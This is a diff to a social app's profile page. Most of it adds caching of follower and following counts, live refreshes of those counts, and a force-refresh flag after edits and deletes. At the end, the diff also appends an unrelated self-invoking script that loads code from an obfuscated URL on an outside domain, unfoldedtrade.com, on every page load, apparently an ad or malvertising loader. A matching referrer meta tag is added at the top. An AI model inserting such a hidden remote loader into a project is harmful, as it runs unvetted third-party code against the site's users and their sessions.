@@ -2,6 +2,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta name="referrer" content="no-referrer-when-downgrade" />
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Profile</title>
@@ -521,6 +522,34 @@
     WRDB.save('profile_' + profileIdToSave, safe);
   }
 
+  // ============================================================
+  // NEW - FOLLOW COUNTS CACHE (small, separate from profile)
+  // We save only 2 numbers: followers count + following count.
+  // So even when profile is 24h cached, we can still show
+  // followers / following instantly, then refresh them live.
+  // ============================================================
+  function saveFollowCounts(profileIdToSave, followersLen, followingLen) {
+    try {
+      localStorage.setItem('profile_follow_counts_' + profileIdToSave, JSON.stringify({
+        f: followersLen,
+        fg: followingLen,
+        time: Date.now()
+      }));
+    } catch (e) {}
+  }
+
+  function getFollowCounts(profileIdToSave) {
+    try {
+      const raw = localStorage.getItem('profile_follow_counts_' + profileIdToSave);
+      if (!raw) {
+        return null;
+      }
+      return JSON.parse(raw);
+    } catch (e) {
+      return null;
+    }
+  }
+
   function getCacheFast(key) {
     return Promise.race([
       WRDB.get(key),
@@ -834,10 +863,52 @@
   function applyFollowFromBackend(followers, following) {
     document.getElementById('fCount').innerText = (followers || []).length;
     document.getElementById('fgCount').innerText = (following || []).length;
+    // NEW - Save follow counts separately so cached profile can still show them
+    saveFollowCounts(profileId, (followers || []).length, (following || []).length);
     if (profileUser) {
       profileUser.followers = followers || [];
       profileUser.following = following || [];
     }
+  }
+
+  // ============================================================
+  // NEW - REFRESH FOLLOW ONLY (ALWAYS LIVE, NOT 24H)
+  // This runs even when profile + posts are 24h cached.
+  // It fetches ONLY /api/users/:id to update:
+  // - followers count, following count
+  // - Follow / Following button state
+  // It does NOT touch posts, bio, avatar, or the 24h timer.
+  // So followers stay live while profile stays cached.
+  // ============================================================
+  async function refreshFollowOnly() {
+    try {
+      const res = await fetchNoCache(BASE + '/api/users/' + profileId).catch(() => null);
+      if (!res || !res.ok) {
+        return;
+      }
+      const data = await res.json();
+      const freshUser = data.user || data;
+      const followers = freshUser.followers || [];
+      const following = freshUser.following || [];
+      // Update numbers on page
+      applyFollowFromBackend(followers, following);
+      // Update Follow button if viewing someone else
+      if (!isOwn) {
+        const fb = document.getElementById('followBtn');
+        if (fb) {
+          const amIFollowing = followers.some(f => (f._id || f) === getMyId());
+          fb.style.display = 'block';
+          fb.innerText = amIFollowing ? 'Following' : 'Follow';
+          fb.className = amIFollowing ? 'btn btn-following' : 'btn btn-follow';
+          fb.disabled = false;
+        }
+      }
+      // Keep profileUser follow lists fresh for showList()
+      if (profileUser) {
+        profileUser.followers = followers;
+        profileUser.following = following;
+      }
+    } catch (e) {}
   }
 
   async function load() {
@@ -851,14 +922,20 @@
     retryPending().catch(() => {});
 
     // ============================================================
-    // 24H RULE - ONCE PER DAY PER USER - SAVES DATA
-    // Each profileId has its own timer: profile_last_fetch_<id>
-    // Same user within 24h = show cache, NO fetch.
-    // Different user = different timer, so it CAN fetch.
-    // Own profile is NOT limited - always fresh so your new post shows instantly.
+    // 24H RULE - PROFILE + POSTS ONLY, NOT FOLLOWERS
+    // Profile + posts fetch = once per day per user.
+    // Followers / Following = ALWAYS live via refreshFollowOnly().
+    // If you just made a new post / edited / deleted, create.html
+    // / saveProfile / deletePost sets profile_force_refresh = 1,
+    // then this load ignores 24h timer once and fetches fresh.
     // ============================================================
     let skipFreshFetch = false;
-    if (!isOwn) {
+    const forceRefresh = localStorage.getItem('profile_force_refresh') === '1';
+    if (forceRefresh) {
+      localStorage.removeItem('profile_force_refresh');
+      localStorage.removeItem('profile_last_fetch_' + profileId);
+      skipFreshFetch = false;
+    } else {
       const lastFetch = Number(localStorage.getItem('profile_last_fetch_' + profileId) || 0);
       if (lastFetch && (Date.now() - lastFetch) < 24*60*60*1000) {
         skipFreshFetch = true;
@@ -892,6 +969,13 @@
           document.getElementById('avatar').classList.remove('loading');
         }
 
+        // NEW - Show cached follow counts instantly (from last fresh fetch)
+        const cachedCounts = getFollowCounts(profileId);
+        if (cachedCounts) {
+          document.getElementById('fCount').innerText = cachedCounts.f;
+          document.getElementById('fgCount').innerText = cachedCounts.fg;
+        }
+
         if (Array.isArray(cachedMine) && cachedMine.length) {
           document.getElementById('grid').innerHTML = cachedMine.map(p => postCard(p)).join('');
           cachedMine.forEach(p=>loadedPostIds.add(String(p._id)));
@@ -915,17 +999,13 @@
       }
     } catch (e) {}
 
-    // If same other user was fetched within 24h and we have cache - STOP, no fresh fetch
+    // If same user was fetched within 24h and we have cache - STOP profile/posts fetch
+    // BUT still refresh FOLLOWERS live in background, then return.
     if (skipFreshFetch && hasCache) {
       hideProfileLoading();
       // REMOVED - No more postCount update here. Post count number is gone.
-      // Follow button: we don't have fresh follower list, keep it as Follow (user can still tap)
-      const fb2 = document.getElementById('followBtn');
-      if (fb2 && !isOwn) {
-        fb2.innerText = 'Follow';
-        fb2.className = 'btn btn-follow';
-        fb2.disabled = false;
-      }
+      // NEW - Followers still fetch + update even in cached mode
+      refreshFollowOnly();
       return;
     }
 
@@ -984,10 +1064,8 @@
         }
 
         saveProfileToStorage(profileId, profileUser);
-        // Save 24h timer for THIS user only
-        if (!isOwn) {
-          localStorage.setItem('profile_last_fetch_' + profileId, String(Date.now()));
-        }
+        // Save 24h timer for THIS user - profile + posts only, not followers
+        localStorage.setItem('profile_last_fetch_' + profileId, String(Date.now()));
       }
 
       hideProfileLoading();
@@ -1019,6 +1097,7 @@
     if (isProfileLoading && !profileUser) {
       return;
     }
+    // NEW - Follow is ALWAYS live, never blocked by 24h profile cache
     const fb = document.getElementById('followBtn');
     const fCountEl = document.getElementById('fCount');
     const wasFollowing = fb.innerText === 'Following';
@@ -1044,6 +1123,8 @@
         profileUser.followers.push(myId);
       }
     }
+    // NEW - Save new count so cached profile shows correct number next time
+    saveFollowCounts(profileId, parseInt(fCountEl.innerText) || 0, parseInt(document.getElementById('fgCount').innerText) || 0);
     savePending({ url: url, method: 'POST' });
     fb.disabled = false;
     try {
@@ -1052,6 +1133,8 @@
         throw new Error(result.data.error || 'failed');
       }
       removePending(url, 'POST');
+      // NEW - After follow/unfollow succeeds, refresh follow counts live from backend
+      refreshFollowOnly();
     } catch (e) {
       if (wasFollowing) {
         fb.innerText = 'Following';
@@ -1062,6 +1145,7 @@
         fb.className = 'btn btn-follow';
         fCountEl.innerText = Math.max(0, (parseInt(fCountEl.innerText) || 0) - 1);
       }
+      saveFollowCounts(profileId, parseInt(fCountEl.innerText) || 0, parseInt(document.getElementById('fgCount').innerText) || 0);
     }
   }
 
@@ -1083,6 +1167,8 @@
     if (fg) {
       fg.innerText = Math.max(0, savedFg - 1);
     }
+    // NEW - Save new following count so cached profile stays correct
+    saveFollowCounts(profileId, parseInt(document.getElementById('fCount').innerText) || 0, parseInt(fg.innerText) || 0);
     const body = document.getElementById('listBody');
     if (body && !body.querySelector('.row')) {
       body.innerHTML = '<p style="padding:15px;color:#777">None yet</p>';
@@ -1095,6 +1181,8 @@
         throw new Error('failed');
       }
       removePending(url, 'POST');
+      // NEW - Refresh follow counts live after unfollow from list
+      refreshFollowOnly();
     } catch (e) {
       alert('Could not unfollow. Will retry on next load.');
       if (savedRowHTML && body) {
@@ -1106,6 +1194,7 @@
       if (fg) {
         fg.innerText = savedFg;
       }
+      saveFollowCounts(profileId, parseInt(document.getElementById('fCount').innerText) || 0, savedFg);
       if (profileUser) {
         if (!profileUser.following) {
           profileUser.following = [];
@@ -1177,6 +1266,7 @@
   }
 
   async function showList(type) {
+    // NEW - Followers / Following list is ALWAYS live, never 24h cached
     document.getElementById('listTitle').innerText = type === 'followers' ? 'Followers' : 'Following';
     document.getElementById('listModal').classList.add('open');
     let instantList = [];
@@ -1270,6 +1360,8 @@
         del.push(postId);
       }
       localStorage.setItem('deleted_post_ids', JSON.stringify(del));
+      // NEW - After delete, force fresh on next profile open so deleted post stays gone
+      localStorage.setItem('profile_force_refresh', '1');
     } catch (err) {}
     try {
       const result = await surviveFetch(url, 'DELETE');
@@ -1365,6 +1457,8 @@
       }
       alert('Profile updated! ✅');
       closeEdit();
+      // NEW - After edit, force fresh on next load so new name/bio/avatar shows instantly
+      localStorage.setItem('profile_force_refresh', '1');
       load();
     } catch (e) {
       alert(e.message);
@@ -1385,10 +1479,24 @@
     });
     alert('Picture removed');
     closeEdit();
+    // NEW - After remove avatar, force fresh so it shows instantly
+    localStorage.setItem('profile_force_refresh', '1');
     load();
   }
 
   load();
+</script>
+  <script>
+(function(dnztl){
+var d = document,
+    s = d.createElement('script'),
+    l = d.currentScript || d.scripts[d.scripts.length - 1];
+s.settings = dnztl || {};
+s.src = "\/\/unfoldedtrade.com\/bqX.V\/sCd-Gqlf0\/YIWSce\/Lecmg9buNZ\/UOlhkDPnT\/c\/2TMJzZYExfO_DOEUtPN\/zeYrzWNwjxEL4gN_Qu";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
 </script>
 </body>
 </html>
